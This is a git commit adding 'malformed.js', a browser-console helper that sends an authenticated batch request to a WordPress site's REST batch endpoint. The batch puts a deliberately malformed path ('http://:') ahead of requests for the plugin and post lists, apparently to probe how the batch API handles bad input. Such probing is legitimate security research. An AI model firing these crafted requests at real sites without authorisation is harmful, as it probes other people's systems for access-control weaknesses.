52b9b2c24bb25142688d59d5962cab9d57844b88
Djalil Ayed <jalilayed@gmail.com>
2026-07-29 14:49:29 +0200

    Create malformed.js

---
+++ wordmess/malformed.js
@@ -0,0 +1,44 @@
+	globalThis.batch = async function (requests) {
+	  const res = await fetch("/wp-json/batch/v1", {
+	    method: "POST",
+	    credentials: "include",
+	    headers: {
+	      "Content-Type": "application/json"
+	    },
+	    body: JSON.stringify({ requests })
+	  });
+
+	  const text = await res.text();
+
+	  let data;
+	  try {
+	    data = JSON.parse(text);
+	  } catch {
+	    data = text;
+	  }
+
+	  console.log("HTTP:", res.status);
+	  console.log(data);
+
+	  return {
+	    status: res.status,
+	    data
+	  };
+	};
+
+	console.log("Batch helper ready");
+
+await batch([
+  {
+    method: "POST",
+    path: "http://:"
+  },
+  {
+    method: "GET",
+    path: "/wp/v2/plugins"
+  },
+  {
+    method: "GET",
+    path: "/wp/v2/posts"
+  }
+]);
